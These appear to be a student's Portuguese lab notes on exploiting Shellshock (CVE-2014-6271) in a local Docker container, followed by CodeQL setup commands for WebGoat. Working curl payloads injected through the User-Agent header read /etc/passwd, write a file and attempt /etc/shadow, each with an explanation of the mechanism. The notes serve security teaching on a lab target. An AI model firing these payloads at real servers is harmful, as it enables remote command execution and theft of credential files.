docker run -it -p 8080:80 --name shellshock jsimao/cs-shellshock-amd64

curl -i http://localhost:8080/cgi-bin/getenv.cgi


Primeiro confirma que o servidor est√° ativo:
curl -i http://localhost:8080/cgi-bin/vul.cgi


############## 2 A

Agora envia o cabe√ßalho User-Agent com c√≥digo Shellshock:
curl -i -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd" http://localhost:8080/cgi-bin/vul.cgi

üß† 2Ô∏è‚É£ Interpreta√ß√£o t√©cnica passo a passo

User-Agent: ‚Üí Cabe√ßalho HTTP injetado pelo cliente.

() { :; }; ‚Üí Cria uma fun√ß√£o bash vazia e √© o gatilho da vulnerabilidade Shellshock.

echo; echo; /bin/cat /etc/passwd ‚Üí S√£o os comandos arbitr√°rios que o atacante deseja que o servidor execute.

O CGI (/cgi-bin/vul.cgi) √© executado pelo bash vulner√°vel, que interpreta o conte√∫do do cabe√ßalho como c√≥digo antes de correr o script.

O comando enviado via cabe√ßalho HTTP User-Agent permitiu executar remotamente o comando /bin/cat /etc/passwd no servidor, obtendo o conte√∫do do ficheiro.
Isto demonstra que o bash utilizado pelo CGI √© vulner√°vel √† vulnerabilidade Shellshock (CVE-2014-6271).

A vulnerabilidade ocorre porque o interpretador bash avalia vari√°veis de ambiente que cont√™m defini√ß√µes de fun√ß√µes, e qualquer c√≥digo ap√≥s a defini√ß√£o da fun√ß√£o √© executado imediatamente ao carregar o ambiente.

Como o servidor Apache exporta vari√°veis de ambiente baseadas nos cabe√ßalhos HTTP, o atacante consegue injetar c√≥digo malicioso nesses cabe√ßalhos e provocar a execu√ß√£o remota de comandos.

O ficheiro /etc/passwd √© usado tradicionalmente para listar as contas de utilizadores no sistema, e a sua leitura demonstra que o atacante conseguiu acesso de execu√ß√£o remota (RCE) no servidor.


############## 2 B
Exemplo: cria um ficheiro /tmp/pwned_by_shellshock.txt com conte√∫do

No teu terminal (Windows cmd ou PowerShell ‚Äî usaste curl assim antes):

curl -i -H "User-Agent: () { :; }; echo; echo; echo 'Exploited File' > /tmp/pwned_by_shellshock.txt" http://localhost:8080/cgi-bin/vul.cgi

Notas:

() { :; }; √© o gatilho Shellshock.

echo; echo; ajuda a preservar o formato CGI (linha vazia).

O > redirecciona o output para o ficheiro /tmp/pwned_by_shellshock.txt.

Entra no container e lista/mostra o ficheiro. Usa o nome do container que usaste ao arrancar (shellshock se seguiste o enunciado). Exemplo

Via entrar em container:
docker exec -it shellshock /bin/bash
# agora est√°s dentro do container (prompt do bash)
ls -l /tmp/pwned_by_shellshock.txt
cat /tmp/pwned_by_shellshock.txt


Via Ataque Shellshock
curl -i -H "User-Agent: () { :; }; echo; echo; /bin/cat /tmp/pwned_by_shellshock.txt" http://localhost:8080/cgi-bin/vul.cgi




############## 2 C
Resposta direta

Normalmente N√ÉO ‚Äî n√£o consegues ler /etc/shadow apenas com o exploit Shellshock, porque esse ficheiro s√≥ √© leg√≠vel por root.
S√≥ conseguir√°s ler /etc/shadow se, excepcionalmente, o processo CGI estiver a correr com privil√©gios de root (muito inseguro) ou se existirem outras fragilidades/erros de configura√ß√£o que permitam eleva√ß√£o de privil√©gios ou exposi√ß√£o do ficheiro.

Em sistemas Linux, /etc/shadow cont√©m hashes de passwords e tem permiss√µes restrit√≠ssimas (tipicamente -rw-r----- ou -rw-------), dono root e grupo shadow ou root.

Os servidores web (Apache) e os scripts CGI normalmente correm sob um utilizador de baixo privil√©gio (por ex. www-data, apache, nobody), n√£o root.

Assim, mesmo que explores Shellshock e consigas execu√ß√£o remota de comandos, esses comandos correm com o privil√©gio do processo web ‚Äî normalmente insuficiente para ler /etc/shadow.

Exce√ß√µes onde seria poss√≠vel:

O Apache/CGI estiver a correr como root (configura√ß√£o errada).

/etc/shadow tiver permiss√µes incorretas (ex.: world-readable) ‚Äî mau gerenciamento.

Existir uma vulnerabilidade local que permita elevar privil√©gios do processo web para root (post-exploitation).

O ficheiro /etc/shadow tiver sido acidentalmente copiado para um local leg√≠vel (logs, backup) que o processo web possa ler.


Ver permiss√µes do ficheiro
curl -i -H "User-Agent: () { :; }; echo; echo; /bin/ls -l /etc/shadow" http://localhost:8080/cgi-bin/vul.cgi

Tentativa de Cat:
curl -i -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/shadow" http://localhost:8080/cgi-bin/vul.cgi


############## 2 D

curl -i "http://localhost:8080/cgi-bin/getenv.cgi?x=%28%29%20%7B%20%3A%3B%20%7D%3B%20echo%3B%20echo%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd"


1) Mostrar que a query string aparece como vari√°vel de ambiente
curl -i "http://localhost:8080/cgi-bin/getenv.cgi?msg=Hello_World"
Evid√™ncia: guarda a sa√≠da (screenshot / copy-paste) ‚Äî isso mostra que o servidor exporta a query string para a vari√°vel de ambiente QUERY_STRING antes de invocar o CGI.

Execut√°mos curl -i "http://localhost:8080/cgi-bin/getenv.cgi?msg=Hello_World" e confirm√°mos que o servidor Apache exporta a query string como vari√°vel de ambiente: QUERY_STRING=msg=Hello_World.
Tent√°mos ent√£o injetar um payload Shellshock na query string e, devido a restri√ß√µes de caracteres no curl do Windows, test√°mos com URL-encoding. O pedido
curl -i "http://localhost:8080/cgi-bin/vul.cgi?x=%28%29%20%7B%20%3A%3B%20%7D%3B%20echo%3B%20echo%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd"
apenas devolveu a resposta normal (Hello World) e n√£o executou o comando cat /etc/passwd. Conclu√≠mos que, embora a QUERY_STRING seja vis√≠vel como vari√°vel de ambiente, neste ambiente espec√≠fico n√£o √© um vetor fi√°vel para Shellshock.





Justifica√ß√µes t√©cnicas: para disparar Shellshock a vari√°vel de ambiente cujo valor √© importado pelo bash tem de come√ßar por () { :; };. Se a query string estiver no formato usual key=value (por exemplo x=()), o valor n√£o come√ßa por () e a vulnerabilidade n√£o √© ativada. Mesmo quando tent√°mos enviar uma query string cujo valor come√ßa por ()... (URL-encoded), o servidor n√£o executou o payload ‚Äî isto pode dever-se a normaliza√ß√µes/sanitiza√ß√µes do Apache/CGI ou √† forma como as vari√°veis s√£o passadas ao bash. Em contrapartida, a inje√ß√£o via cabe√ßalhos HTTP (ex.: User-Agent) mostrou-se efectiva neste mesmo ambiente.



cd WebGoat
codeql database create webgoat-database --language=java --overwrite





# Parte 2

ql/java/ql/src/Security/CWE/CWE-798/HardcodedPasswordField.ql